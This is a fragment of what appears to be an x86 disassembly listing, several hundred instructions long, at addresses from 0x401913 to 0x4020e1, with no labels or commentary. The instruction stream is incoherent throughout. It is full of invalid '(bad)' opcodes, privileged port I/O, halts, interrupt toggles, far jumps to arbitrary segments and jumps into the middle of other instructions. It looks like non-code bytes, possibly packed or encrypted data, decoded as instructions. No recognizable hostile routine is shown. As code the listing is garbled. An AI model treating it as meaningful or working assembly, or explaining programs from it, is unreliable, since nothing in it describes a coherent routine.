  401913:	cld    
  401914:	push   0x51b7afbc
  401919:	retf   0xf35d
  40191c:	shl    DWORD PTR [edi+0x566e6b75],0x44
  401923:	xor    eax,0xb0016e15
  401928:	sub    al,0xfa
  40192a:	jno    0x4018e3
  40192c:	cld    
  40192d:	push   0x30
  40192f:	gs mov cl,0x55
  401932:	gs mov esp,0xf79aad59
  401938:	icebp  
  401939:	(bad)  
  40193a:	pop    ebx
  40193b:	iret   
  40193c:	mov    ebx,0xbd601182
  401941:	out    dx,al
  401942:	rcpps  xmm0,XMMWORD PTR [esi+0x7079d4c7]
  401949:	fidivr WORD PTR [esi+esi*8-0x1b5ae838]
  401950:	sti    
  401951:	fcom   DWORD PTR [eax]
  401953:	dec    esi
  401954:	fld    QWORD PTR [ecx+0x16]
  401957:	jnp    0x401991
  401959:	xchg   edi,eax
  40195a:	shl    BYTE PTR [eax+eiz*2],0x63
  40195e:	lock inc ecx
  401960:	jno    0x40196d
  401962:	out    dx,eax
  401963:	nop    eax
  401966:	jno    0x401939
  401968:	test   DWORD PTR [ecx-0x18bdeaf5],ebx
  40196e:	sti    
  40196f:	arpl   WORD PTR [ecx-0x7f],bp
  401972:	fcmovb st,st(0)
  401974:	sub    DWORD PTR [ebx],0x677b7627
  40197a:	mov    DWORD PTR [esi],edx
  40197c:	pop    eax
  40197d:	mov    ebx,0xcd652f87
  401982:	outs   dx,BYTE PTR ds:[esi]
  401983:	adc    DWORD PTR [esi+ebp*4],ebp
  401986:	in     al,0xef
  401988:	adc    DWORD PTR [edi-0x1c334655],0xac455249
  401992:	push   0x502ee8b3
  401997:	icebp  
  401998:	(bad)  [ebp-0x24]
  40199b:	test   DWORD PTR [eax-0x63],esp
  40199e:	sti    
  40199f:	cmp    al,BYTE PTR ds:0x66756b06
  4019a5:	mov    ds:0xa87f0eb8,al
  4019aa:	out    0x95,al
  4019ac:	or     al,0x36
  4019ae:	mov    dl,bl
  4019b0:	inc    ebx
  4019b1:	inc    eax
  4019b2:	repz call 0xbeb7bb3e
  4019b8:	jp     0x4019ee
  4019ba:	std    
  4019bb:	lea    esi,[edx+0x1492e382]
  4019c1:	sub    al,0x49
  4019c3:	mov    esi,0xbdf56a1c
  4019c8:	mov    cl,0xd2
  4019ca:	nop
  4019cb:	lods   al,BYTE PTR ds:[esi]
  4019cc:	das    
  4019cd:	xor    al,0xdc
  4019cf:	add    edx,DWORD PTR [ebx+0x7a]
  4019d2:	rcl    DWORD PTR [ecx],1
  4019d4:	and    ch,BYTE PTR [eax+esi*2-0x36]
  4019d8:	mov    dh,cl
  4019da:	pop    eax
  4019db:	adc    DWORD PTR [esi-0x20],ebx
  4019de:	fcmove st,st(0)
  4019e0:	aad    0xbc
  4019e2:	inc    edi
  4019e3:	add    BYTE PTR [esi+0x2b],0xad
  4019e7:	mov    esp,0xe725365e
  4019ec:	add    eax,edi
  4019ee:	repnz cli 
  4019f0:	scas   eax,DWORD PTR es:[edi]
  4019f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4019f2:	enter  0x83ad,0xed
  4019f6:	scas   eax,DWORD PTR es:[edi]
  4019f7:	fisubr DWORD PTR [ebx]
  4019f9:	leave  
  4019fa:	ret    0x6d51
  4019fd:	mov    DWORD PTR [ebx+0x4589ffb],esi
  401a03:	dec    ebp
  401a04:	jb     0x4019ec
  401a06:	cwde   
  401a07:	jb     0x401a7e
  401a09:	jbe    0x4019c1
  401a0b:	sti    
  401a0c:	cmp    BYTE PTR [ebp+0xb],dl
  401a0f:	sbb    dl,BYTE PTR [esp+ecx*2+0x718696c9]
  401a16:	mov    eax,0x1b8f5d39
  401a1b:	pop    eax
  401a1c:	mov    WORD PTR [ebx+0x14],es
  401a1f:	sbb    al,0xda
  401a21:	mov    ds:0x89bc75d8,al
  401a26:	shl    BYTE PTR [esp+edi*4-0x9],1
  401a2a:	aad    0x58
  401a2c:	mov    esi,0x2ed9ab66
  401a31:	jl     0x4019b5
  401a33:	mov    esp,0x33f464f
  401a38:	and    dl,bh
  401a3a:	pop    eax
  401a3b:	outs   dx,BYTE PTR ds:[esi]
  401a3c:	std    
  401a3d:	push   0x1f1ccb41
  401a42:	mov    DWORD PTR cs:[edx+0x21],esp
  401a46:	dec    BYTE PTR [eax+ebp*8-0x21]
  401a4a:	xor    edx,DWORD PTR [edx]
  401a4c:	les    ebx,FWORD PTR [ecx-0x7d3985c1]
  401a52:	xor    eax,0x5dab8148
  401a57:	jno    0x401a0d
  401a59:	hlt    
  401a5a:	cmovle edx,DWORD PTR [eax+0x729e7397]
  401a61:	in     al,0x73
  401a63:	xchg   ecx,eax
  401a64:	push   ecx
  401a65:	push   edx
  401a66:	pop    ebx
  401a67:	xor    DWORD PTR ds:0x8c4ea323,esi
  401a6d:	adc    BYTE PTR [ebx+0x72813cc1],0xe6
  401a74:	sbb    BYTE PTR [esi-0x15],0x1c
  401a78:	int3   
  401a79:	xchg   ebx,eax
  401a7a:	adc    al,0x43
  401a7c:	aas    
  401a7d:	jmp    0x401abb
  401a7f:	test   cl,0xc8
  401a82:	hlt    
  401a83:	pop    ebx
  401a84:	je     0x401a26
  401a86:	mov    esp,0x6ad2d7bd
  401a8b:	fwait
  401a8c:	into   
  401a8d:	xchg   DWORD PTR [ecx-0x3b],ebx
  401a90:	xchg   DWORD PTR [ebp-0x3f3beecf],ecx
  401a96:	fdivr  st(0),st
  401a98:	mov    eax,eax
  401a9a:	add    ebp,esp
  401a9c:	arpl   di,sp
  401a9e:	and    BYTE PTR [esi],dh
  401aa0:	dec    esi
  401aa1:	push   ecx
  401aa2:	in     eax,dx
  401aa3:	fbstp  TBYTE PTR [eax+esi*8]
  401aa6:	sar    ebp,0x2f
  401aa9:	adc    DWORD PTR [ebx+ecx*2+0x1],esi
  401aad:	mov    ah,0xb2
  401aaf:	jp     0x401a63
  401ab1:	stos   BYTE PTR es:[edi],al
  401ab2:	lahf   
  401ab3:	and    al,0x77
  401ab5:	adc    BYTE PTR [esi-0x8606e8e],0x92
  401abc:	in     eax,0xb2
  401abe:	enterw 0x3d90,0xf8
  401ac3:	stos   BYTE PTR es:[edi],al
  401ac4:	aaa    
  401ac5:	shl    BYTE PTR [ecx],1
  401ac7:	jmp    0x491d:0x634e74e5
  401ace:	int3   
  401acf:	xchg   edx,eax
  401ad0:	add    esi,DWORD PTR [eax+0x631a28b9]
  401ad6:	xor    edx,esi
  401ad8:	mov    bl,bl
  401ada:	add    DWORD PTR [ebp+0x72],esi
  401add:	lods   al,BYTE PTR ds:[esi]
  401ade:	xchg   esi,eax
  401adf:	div    DWORD PTR fs:[edx+0x918f502]
  401ae6:	mov    bh,0x3b
  401ae8:	imul   ebp,DWORD PTR [ebx],0x657aa2de
  401aee:	js     0x401b2a
  401af0:	or     DWORD PTR [ecx],ebx
  401af2:	call   DWORD PTR [ebx+0x174d9e5a]
  401af8:	xchg   ebp,eax
  401af9:	repz jb 0x401b14
  401afc:	repz cwde 
  401afe:	cmc    
  401aff:	inc    eax
  401b00:	xchg   bh,cl
  401b02:	xchg   edx,eax
  401b03:	mov    ebx,0x58ab850
  401b08:	and    eax,0x1dc03f89
  401b0d:	xchg   bl,bl
  401b0f:	ins    BYTE PTR es:[edi],dx
  401b10:	ror    DWORD PTR [edi],cl
  401b12:	or     al,0x46
  401b14:	or     ah,BYTE PTR [eax]
  401b16:	es add al,0x85
  401b19:	(bad)  
  401b1a:	or     eax,0xb5563997
  401b1f:	mov    ch,0xec
  401b21:	ret    
  401b22:	cmp    al,0x7
  401b24:	adc    ecx,0x2899e522
  401b2a:	xor    BYTE PTR [ebx],dh
  401b2c:	in     eax,0xc3
  401b2e:	clc    
  401b2f:	mov    ecx,0xa4f8abd1
  401b34:	les    esi,FWORD PTR [edi+eiz*4-0x14]
  401b38:	cwde   
  401b39:	add    ah,BYTE PTR [eax-0x10]
  401b3c:	inc    esp
  401b3d:	push   ecx
  401b3e:	pusha  
  401b3f:	ins    BYTE PTR es:[edi],dx
  401b40:	inc    DWORD PTR ds:[edx-0x57aadf6c]
  401b47:	push   ebx
  401b48:	xchg   ebp,eax
  401b49:	aaa    
  401b4a:	xor    DWORD PTR [edi],edx
  401b4c:	jl     0x401afc
  401b4e:	pop    edi
  401b4f:	and    edi,DWORD PTR [eax]
  401b51:	hlt    
  401b52:	loope  0x401ade
  401b54:	push   ebx
  401b55:	mov    WORD PTR gs:[ebp+eiz*2-0x21de85f4],cs
  401b5d:	ret    
  401b5e:	inc    BYTE PTR [esi]
  401b60:	and    al,0xa4
  401b62:	cdq    
  401b63:	sub    al,0x1e
  401b65:	in     eax,dx
  401b66:	sbb    al,0xc0
  401b68:	push   eax
  401b69:	and    DWORD PTR [esi],0xffffffba
  401b6c:	dec    ecx
  401b6d:	adc    eax,0xd871fba1
  401b72:	or     ah,ah
  401b74:	ret    0xe1f5
  401b77:	(bad)  
  401b78:	test   DWORD PTR [esp+edi*4-0x3c78e2eb],0x282cc705
  401b83:	stc    
  401b84:	es push 0xfffffffb
  401b87:	mov    edi,ebx
  401b89:	das    
  401b8a:	and    dl,0xe3
  401b8d:	and    al,0xd8
  401b8f:	xchg   edx,eax
  401b90:	cmc    
  401b91:	addr16 push ss
  401b93:	(bad)  ds:0xc1b3f158
  401b99:	dec    ebx
  401b9a:	ficomp WORD PTR [edi]
  401b9c:	int    0x4
  401b9e:	fnstenv [eax+0xdc82fa9]
  401ba4:	(bad)  
  401ba6:	pop    ecx
  401ba7:	mov    edx,0x942afd43
  401bac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401bad:	push   edx
  401bae:	cmp    edi,DWORD PTR [edx]
  401bb0:	xor    eax,0x329f8146
  401bb5:	fwait
  401bb6:	xor    BYTE PTR [ecx+0x70d479ae],0xea
  401bbd:	dec    edx
  401bbe:	push   es
  401bbf:	inc    esp
  401bc0:	push   es
  401bc1:	(bad)  
  401bc2:	sbb    eax,0x231be332
  401bc7:	mov    bl,0x9d
  401bc9:	fisubr DWORD PTR [eax+edx*4]
  401bcc:	cmp    esi,edi
  401bce:	xlat   BYTE PTR ds:[ebx]
  401bcf:	jbe    0x401b92
  401bd1:	hlt    
  401bd2:	and    eax,0xb22ae1d7
  401bd7:	jne    0x401be4
  401bd9:	mov    bl,0x56
  401bdb:	push   ebp
  401bdc:	push   eax
  401bdd:	mov    esp,0x17b95b48
  401be2:	(bad)  
  401be3:	mov    eax,ds:0xe04299f
  401be8:	int3   
  401be9:	or     eax,0x25a70881
  401bee:	mov    bh,BYTE PTR [edi+0x4a261082]
  401bf4:	fimul  DWORD PTR [ebp+0x4c]
  401bf7:	shr    esp,1
  401bf9:	xchg   ebp,eax
  401bfa:	dec    ebx
  401bfb:	or     dl,bl
  401bfd:	out    0x25,al
  401bff:	jecxz  0x401baa
  401c01:	push   esi
  401c02:	repnz cmc 
  401c04:	(bad)  
  401c06:	daa    
  401c07:	ret    0x59fb
  401c0a:	sbb    eax,0xabf9c50d
  401c0f:	add    eax,0x5f67b222
  401c14:	ins    DWORD PTR es:[di],dx
  401c16:	xchg   dh,ah
  401c18:	xchg   eax,edi
  401c1a:	xchg   ebx,eax
  401c1b:	(bad)  
  401c1c:	mov    edi,0xecd3a5a
  401c21:	ins    DWORD PTR es:[edi],dx
  401c22:	fidivr DWORD PTR [ecx-0x48]
  401c25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401c26:	cmp    BYTE PTR [eax],dl
  401c28:	ror    dl,1
  401c2a:	cld    
  401c2b:	test   DWORD PTR [esi+0x2f4e01f0],0xfcb2d5d6
  401c35:	pop    esp
  401c36:	out    0xce,al
  401c38:	and    BYTE PTR [edx+0x6e],al
  401c3b:	sub    ebp,DWORD PTR [edx]
  401c3d:	mov    edx,0xb614f09e
  401c42:	adc    al,0x71
  401c44:	push   edx
  401c45:	sub    esp,esp
  401c47:	into   
  401c48:	mov    ecx,0x9b216e54
  401c4d:	jg     0x401c92
  401c4f:	cmp    eax,0x7934b3aa
  401c54:	inc    esi
  401c55:	push   edi
  401c56:	into   
  401c57:	pop    edi
  401c58:	pusha  
  401c59:	pop    edx
  401c5a:	rcl    BYTE PTR [ebp+0x63],0x16
  401c5e:	inc    edi
  401c5f:	rcr    BYTE PTR [eax],cl
  401c61:	pusha  
  401c62:	or     al,0xfd
  401c64:	push   eax
  401c65:	pop    ds
  401c66:	outs   dx,DWORD PTR ds:[esi]
  401c67:	mov    ds:0x38dddd01,eax
  401c6c:	mov    DWORD PTR [eax],ebp
  401c6e:	lods   al,BYTE PTR ds:[esi]
  401c6f:	jae    0x401ce1
  401c71:	push   esi
  401c72:	push   ebx
  401c73:	mov    bl,BYTE PTR [ecx*2+0x2a08c052]
  401c7a:	mov    al,0xcc
  401c7c:	test   al,0xaa
  401c7e:	inc    eax
  401c7f:	in     al,0x6c
  401c81:	retf   0xcbf2
  401c84:	mov    al,ds:0xacf90b95
  401c89:	or     ebx,DWORD PTR [esi+ebx*2-0x52]
  401c8d:	test   ebx,eax
  401c8f:	ss js  0x401c99
  401c92:	outs   dx,BYTE PTR ds:[esi]
  401c93:	xchg   ebp,eax
  401c94:	sar    BYTE PTR [eax+0x5bc74e6f],1
  401c9a:	sub    al,0xee
  401c9c:	xchg   esi,eax
  401c9d:	xchg   ecx,eax
  401c9e:	(bad)  
  401c9f:	add    DWORD PTR [ecx-0x18],edi
  401ca2:	pop    es
  401ca3:	hlt    
  401ca4:	js     0x401d05
  401ca6:	mov    eax,ds:0xbfa365a9
  401cab:	into   
  401cac:	sbb    al,0x8
  401cae:	aad    0x38
  401cb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cb1:	sub    al,0xb6
  401cb3:	jbe    0x401c94
  401cb5:	jae    0x401cbf
  401cb7:	adc    al,0xe2
  401cb9:	jae    0x401d06
  401cbb:	push   cs
  401cbc:	jp     0x401cac
  401cbe:	xor    dh,BYTE PTR [eax+0x12]
  401cc1:	jns    0x401ce5
  401cc3:	dec    ebx
  401cc4:	mov    dl,0xfa
  401cc6:	sahf   
  401cc7:	mov    al,ds:0xd4bb10aa
  401ccc:	jmp    0xa0fe872c
  401cd1:	dec    esp
  401cd2:	mov    BYTE PTR [edi-0x1dea3f9],bl
  401cd8:	xchg   esi,eax
  401cd9:	sub    al,BYTE PTR [ebp+0x3e1e590c]
  401cdf:	lds    edx,FWORD PTR [eax+0x56]
  401ce2:	sub    al,0xf8
  401ce4:	stos   BYTE PTR es:[edi],al
  401ce5:	pop    ecx
  401ce6:	loope  0x401c6e
  401ce8:	lds    eax,FWORD PTR [ebx+ebx*1]
  401ceb:	jae    0x401d1f
  401ced:	cld    
  401cee:	sbb    DWORD PTR [edi+0x5fe76521],esp
  401cf4:	sub    esi,DWORD PTR [ebx+0x21]
  401cf7:	xor    dh,BYTE PTR [eax-0x41cd5540]
  401cfd:	sub    al,0xae
  401cff:	retf   0xab8f
  401d02:	mov    ch,0x4e
  401d04:	in     eax,0xde
  401d06:	stos   DWORD PTR es:[edi],eax
  401d07:	adc    eax,0x7f2f9600
  401d0c:	imul   edx,DWORD PTR [ebp-0x27380dee],0x9888f89c
  401d16:	mov    eax,ds:0xc778884c
  401d1b:	nop
  401d1c:	dec    eax
  401d1d:	(bad)  
  401d1f:	enter  0x4593,0x35
  401d23:	(bad)  
  401d24:	xchg   eax,ebp
  401d26:	dec    esp
  401d27:	and    eax,0xf4b16f4d
  401d2c:	pop    edx
  401d2d:	(bad)  
  401d2e:	pop    ecx
  401d2f:	pushf  
  401d30:	dec    esi
  401d31:	scas   al,BYTE PTR es:[edi]
  401d32:	pop    ebp
  401d33:	dec    eax
  401d34:	and    ah,BYTE PTR ds:0x511e6298
  401d3a:	sbb    al,0xe4
  401d3c:	jmp    0xc0690645
  401d41:	(bad)  
  401d42:	maxps  xmm0,xmm5
  401d45:	jp     0x401cfc
  401d47:	cdq    
  401d48:	dec    ebx
  401d4a:	xor    eax,0xff325b01
  401d4f:	cmc    
  401d50:	dec    ecx
  401d51:	mov    ecx,DWORD PTR [ebx]
  401d53:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401d54:	sbb    al,0xdf
  401d56:	sti    
  401d57:	out    0x33,eax
  401d59:	jmp    0x401d3a
  401d5b:	adc    esi,esi
  401d5d:	inc    esp
  401d5e:	imul   esi,DWORD PTR [ebx+edx*1],0xb528df7b
  401d65:	shl    DWORD PTR [edx-0x52],cl
  401d68:	mov    edi,0x68e97c96
  401d6d:	mov    edx,0x35ef03d5
  401d72:	ret    0xe69d
  401d75:	retf   
  401d76:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401d77:	mov    ds:0xab28844c,al
  401d7c:	ret    
  401d7d:	aaa    
  401d7e:	(bad)  
  401d7f:	lock (bad) 
  401d81:	lds    ebp,FWORD PTR [eax]
  401d83:	push   eax
  401d84:	xchg   ecx,eax
  401d85:	aas    
  401d86:	fincstp 
  401d88:	repnz test DWORD PTR [ebx+0x7b4c6d99],esp
  401d8f:	js     0x401d6f
  401d91:	out    dx,eax
  401d92:	push   eax
  401d93:	sub    esp,DWORD PTR [esi-0x1dbbd9b]
  401d99:	pop    ss
  401d9a:	mov    ebp,0x654123b4
  401d9f:	xor    al,0xe3
  401da1:	push   0xe3e5eb60
  401da6:	mov    ebp,0x38f410bc
  401dab:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401dac:	mov    eax,0x4d538982
  401db2:	popa   
  401db3:	jle    0x401d69
  401db5:	adc    dh,ch
  401db7:	dec    ebx
  401db8:	aam    0xa8
  401dba:	loop   0x401d3e
  401dbc:	js     0x401d9f
  401dbe:	pop    ecx
  401dbf:	ds push ebx
  401dc1:	pop    ss
  401dc2:	(bad)  
  401dc3:	les    esi,FWORD PTR [esp+ebx*2-0x74]
  401dc7:	hlt    
  401dc8:	cmp    eax,0xf8a262cb
  401dcd:	push   cs
  401dce:	adc    dh,BYTE PTR [eax+0x350af2]
  401dd4:	mov    esp,0xe5c3c6aa
  401dd9:	call   0x7591:0x7685674d
  401de0:	jge    0x401d8f
  401de2:	fstp   QWORD PTR [ecx-0x842750a]
  401de8:	cdq    
  401de9:	sbb    eax,0xbfa9f1eb
  401dee:	repnz push ss
  401df0:	or     eax,0x46127917
  401df5:	jge    0x401dfd
  401df7:	pop    ebx
  401df8:	cs xchg ecx,eax
  401dfa:	mov    ah,BYTE PTR [edx-0x60]
  401dfd:	into   
  401dfe:	xor    esi,DWORD PTR [eax-0x7c]
  401e01:	pop    edx
  401e02:	(bad)  
  401e03:	ins    DWORD PTR es:[edi],dx
  401e04:	mov    ecx,0x7205935d
  401e09:	call   0xd265:0xed25b56c
  401e10:	pop    edi
  401e11:	sbb    DWORD PTR [edi+eax*8-0x573ff36c],eax
  401e18:	fisub  WORD PTR [ebx+0x4]
  401e1b:	(bad)  
  401e1c:	hlt    
  401e1d:	(bad)
  401e20:	lds    ecx,FWORD PTR [esi+edx*2]
  401e23:	xchg   ebx,eax
  401e24:	clc    
  401e25:	arpl   WORD PTR [edi+0x29],sp
  401e28:	pushf  
  401e29:	imul   esi,DWORD PTR [edx-0x32],0xaccbc9a3
  401e30:	out    dx,al
  401e31:	dec    ecx
  401e32:	(bad)  ds:0x3ff6b641
  401e38:	(bad)  
  401e39:	cli    
  401e3a:	sub    ebx,eax
  401e3c:	es int 0x5e
  401e3f:	and    al,0x14
  401e41:	add    ebx,DWORD PTR [eax+esi*8]
  401e44:	into   
  401e45:	or     BYTE PTR [ecx+0x3dc321cc],ah
  401e4b:	mov    edi,0x4fb6cbf1
  401e50:	rol    BYTE PTR [edx-0x7d],cl
  401e53:	pusha  
  401e54:	mov    ebx,0x7d6be003
  401e59:	adc    ah,BYTE PTR [edx]
  401e5b:	sahf   
  401e5c:	inc    esp
  401e5d:	clc    
  401e5e:	stos   BYTE PTR es:[edi],al
  401e5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e60:	push   edx
  401e61:	cmp    al,0x95
  401e63:	pop    eax
  401e64:	ds into 
  401e66:	jne    0x401e78
  401e68:	pop    ecx
  401e69:	leave  
  401e6a:	inc    esi
  401e6b:	ins    DWORD PTR es:[edi],dx
  401e6c:	dec    edx
  401e6d:	test   eax,0xb58b7c09
  401e72:	inc    edi
  401e73:	out    dx,eax
  401e74:	xchg   ebp,eax
  401e75:	add    ebp,eax
  401e77:	lods   eax,DWORD PTR ds:[esi]
  401e78:	cmp    eax,DWORD PTR [ebx+0x1f]
  401e7b:	adc    eax,0xc4f88bd4
  401e80:	cmp    BYTE PTR [eax+ebp*4],dh
  401e83:	aaa    
  401e84:	and    edx,eax
  401e86:	or     al,0x4c
  401e88:	sub    eax,0x21ef80f9
  401e8d:	sar    DWORD PTR [eax+edi*2+0xa9641eb],cl
  401e94:	mov    esp,0x8b10895e
  401e99:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401e9a:	out    0x65,al
  401e9c:	or     ah,ah
  401e9e:	ss xchg esi,eax
  401ea0:	and    al,0x9d
  401ea2:	mov    dh,BYTE PTR [eax+esi*1-0x73cb351e]
  401ea9:	sbb    DWORD PTR [eax],eax
  401eab:	xor    al,0x46
  401ead:	shl    BYTE PTR [ebx-0x45],1
  401eb0:	push   0xffffffc0
  401eb2:	int3   
  401eb3:	les    ecx,FWORD PTR [edi+ebx*1+0x65d5e64f]
  401eba:	fidiv  WORD PTR [edx+0x7c]
  401ebd:	out    dx,al
  401ebe:	xchg   edi,eax
  401ebf:	mov    ax,ds:0x746e484c
  401ec5:	add    eax,0x699b79c4
  401eca:	test   al,0xef
  401ecc:	cmp    edx,DWORD PTR [edx]
  401ece:	dec    eax
  401ecf:	adc    al,0x6c
  401ed1:	iret   
  401ed2:	int    0x13
  401ed4:	imul   esp,edx,0xf2165263
  401eda:	cmp    ebp,DWORD PTR [eax-0x7f]
  401edd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401ede:	sub    al,0xcc
  401ee0:	mov    ch,0x1e
  401ee2:	aas    
  401ee3:	in     eax,0x61
  401ee5:	ret    0x545e
  401ee8:	aaa    
  401ee9:	cs cmp ah,ah
  401eec:	mov    ecx,0x8795488f
  401ef1:	cmp    cl,BYTE PTR [ebx-0x61c29861]
  401ef7:	lea    esi,[edi+edi*4]
  401efa:	jg     0x401ef6
  401efc:	ret    0x60cc
  401eff:	ins    DWORD PTR es:[edi],dx
  401f00:	sbb    dl,BYTE PTR [esi+0x75f213cb]
  401f06:	fimul  DWORD PTR [esi]
  401f08:	push   edx
  401f09:	lock push esi
  401f0b:	sbb    al,0x40
  401f0d:	mov    ecx,0xbcf4e02e
  401f12:	pop    esi
  401f13:	add    eax,edi
  401f15:	dec    BYTE PTR [ecx+0x52]
  401f18:	pop    ebx
  401f19:	ins    BYTE PTR es:[edi],dx
  401f1a:	jp     0x401f70
  401f1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f1d:	or     bh,BYTE PTR [ecx]
  401f1f:	adc    esi,eax
  401f21:	sahf   
  401f22:	push   ds
  401f23:	push   ds
  401f24:	call   0xd4be:0xdc1d2e2e
  401f2b:	and    eax,0x970275f0
  401f30:	sbb    bl,BYTE PTR [edi+0x31]
  401f33:	mov    dh,0xa6
  401f35:	inc    ebp
  401f36:	pop    eax
  401f37:	dec    esi
  401f38:	lods   eax,DWORD PTR ds:[esi]
  401f39:	test   BYTE PTR [ebx+0x4e7eb499],ah
  401f3f:	fwait
  401f40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401f41:	pop    ss
  401f42:	imul   ebx,DWORD PTR [edi+0x66],0xf7305149
  401f49:	adc    eax,0x8c6ad04d
  401f4e:	xor    DWORD PTR [eax+0x33],esi
  401f51:	lea    edi,[ebx+edi*2+0x1505f3ba]
  401f58:	xchg   BYTE PTR ds:0x2b6ed249,dl
  401f5e:	inc    esi
  401f5f:	aad    0x86
  401f61:	sahf   
  401f62:	ds (bad) 
  401f64:	sbb    al,0x27
  401f66:	xchg   edx,eax
  401f67:	into   
  401f68:	mov    ds:0xd7563add,al
  401f6d:	test   DWORD PTR [ecx+0x50],edi
  401f70:	xchg   ebp,eax
  401f71:	imul   ebp,DWORD PTR ds:0x1a5b0478,0xffffffbe
  401f78:	jmp    0x7dea:0xfad0c102
  401f7f:	and    eax,DWORD PTR [ebx+0x6b]
  401f82:	jmp    0xa8aaeac
  401f87:	mov    fs,WORD PTR [edi-0x44]
  401f8a:	cmc    
  401f8b:	js     0x401f9a
  401f8d:	inc    ebx
  401f8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f8f:	add    al,BYTE PTR [ebx+0x53]
  401f92:	cli    
  401f93:	add    BYTE PTR [edi+0x76],cl
  401f96:	xor    ah,BYTE PTR [ebx+0x4222c463]
  401f9c:	dec    edx
  401f9d:	mov    ebp,0x258455e9
  401fa2:	call   0x99e5c277
  401fa7:	xchg   esp,eax
  401fa8:	sti    
  401fa9:	jnp    0x401f63
  401fab:	jge    0x401faa
  401fad:	or     ebx,edi
  401faf:	sahf   
  401fb0:	iret   
  401fb1:	push   ss
  401fb2:	jno    0x401f84
  401fb4:	adc    BYTE PTR [eax],dl
  401fb6:	or     bl,BYTE PTR [ebp+0x2e7da7e8]
  401fbc:	inc    eax
  401fbd:	gs popa 
  401fbf:	inc    BYTE PTR [edi+0x3db4b0e8]
  401fc5:	xlat   BYTE PTR ds:[ebx]
  401fc6:	ret    
  401fc7:	shl    BYTE PTR [edx+0x4fa2786],0x12
  401fce:	dec    esi
  401fcf:	mov    ecx,0xc07992d8
  401fd4:	mov    dh,0x3b
  401fd6:	stos   DWORD PTR es:[edi],eax
  401fd7:	or     DWORD PTR [eax],edi
  401fd9:	pop    eax
  401fda:	mov    bl,0x3a
  401fdc:	adc    ebp,esp
  401fde:	or     DWORD PTR [ebp+0x3beb9e9],edi
  401fe4:	push   esp
  401fe5:	(bad)  
  401fe6:	ins    DWORD PTR es:[edi],dx
  401fe7:	(bad)  
  401fe8:	dec    edi
  401fe9:	shl    DWORD PTR [edi+0x573e89f7],1
  401fef:	fwait
  401ff0:	inc    edi
  401ff1:	ficomp WORD PTR [ebx]
  401ff3:	pop    edi
  401ff4:	clc    
  401ff5:	cmp    eax,0xec241b3d
  401ffa:	pop    ebx
  401ffb:	cmp    ch,BYTE PTR [ebx+0x775da17b]
  402001:	add    eax,0xa2fd522
  402006:	mov    dh,0xb
  402008:	cmp    al,0xf4
  40200a:	inc    ebp
  40200b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40200c:	mov    edx,ecx
  40200e:	add    bl,BYTE PTR [edx-0x7f]
  402011:	adc    DWORD PTR [esi],ecx
  402013:	icebp  
  402014:	into   
  402015:	xchg   edi,eax
  402016:	inc    ebx
  402017:	xchg   edx,eax
  402018:	shl    BYTE PTR [esi-0x56],cl
  40201b:	xor    BYTE PTR [esi+0x63],dh
  40201e:	js     0x401ffc
  402020:	les    edi,FWORD PTR [edi]
  402022:	mov    edi,0xf1ffff98
  402027:	sub    eax,0xd73effad
  40202c:	cmp    al,0xbd
  40202e:	rep lods al,BYTE PTR ds:[esi]
  402030:	jle    0x401fda
  402032:	jmp    0xb3a2:0xd2d29ba9
  402039:	cmp    DWORD PTR [edx+ebx*8-0x5],0x5c360d25
  402041:	ins    DWORD PTR es:[edi],dx
  402042:	sub    ebx,edx
  402044:	idiv   DWORD PTR [ecx]
  402046:	mov    ebp,0x508f082c
  40204b:	icebp  
  40204c:	es mov cs:0x720e415,al
  402053:	out    0xd7,eax
  402055:	cwde   
  402056:	sub    al,0xf1
  402058:	aas    
  402059:	test   al,0x60
  40205b:	or     al,0x52
  40205d:	jecxz  0x402073
  40205f:	out    0xe1,eax
  402061:	hlt    
  402062:	jae    0x40205d
  402064:	push   esi
  402065:	jmp    0xdd84ec6c
  40206a:	pop    eax
  40206b:	xor    al,0x54
  40206d:	mov    bh,0x37
  40206f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402070:	xor    ah,BYTE PTR gs:[ebx]
  402073:	sbb    ecx,DWORD PTR [eax-0x78]
  402076:	mov    ebx,0xf50ce421
  40207b:	outs   dx,DWORD PTR ds:[esi]
  40207c:	xchg   ebp,eax
  40207d:	loopne 0x40203f
  40207f:	std    
  402080:	es jnp 0x40206a
  402083:	int    0x57
  402085:	inc    esp
  402086:	fcmove st,st(5)
  402088:	ret    0xd414
  40208b:	sbb    al,0xb
  40208d:	cmp    DWORD PTR [ecx],edi
  40208f:	test   al,0x4
  402091:	sub    ebp,DWORD PTR [ecx+0x4]
  402094:	out    dx,eax
  402095:	and    DWORD PTR [ebx+edi*1],esi
  402098:	ins    DWORD PTR es:[edi],dx
  402099:	repnz push edi
  40209b:	xor    DWORD PTR [ecx+0xd],ebp
  40209e:	fcmovb st,st(4)
  4020a0:	or     eax,esp
  4020a2:	mov    ecx,0x7cfc9d9a
  4020a7:	sub    al,0xa4
  4020a9:	lods   eax,DWORD PTR ds:[esi]
  4020aa:	mov    esi,0x2d72955c
  4020af:	ins    BYTE PTR es:[edi],dx
  4020b0:	xor    BYTE PTR [ecx-0x1510081f],bl
  4020b6:	fs call 0x733a3cb5
  4020bc:	aaa    
  4020bd:	js     0x4020c3
  4020bf:	adc    eax,0xe6a54cc
  4020c4:	jmp    0x7e53:0x7c64b699
  4020cb:	test   eax,0x37cbe78f
  4020d0:	arpl   WORD PTR [ebx-0x5],di
  4020d3:	lods   eax,DWORD PTR ds:[esi]
  4020d4:	sub    edx,0xffffffed
  4020d7:	jmp    0x4020b0
  4020d9:	mov    esp,0x18941b90
  4020de:	adc    ah,bh
  4020e0:	ins    BYTE PTR es:[edi],dx
  4020e1:	jmp    0x402069
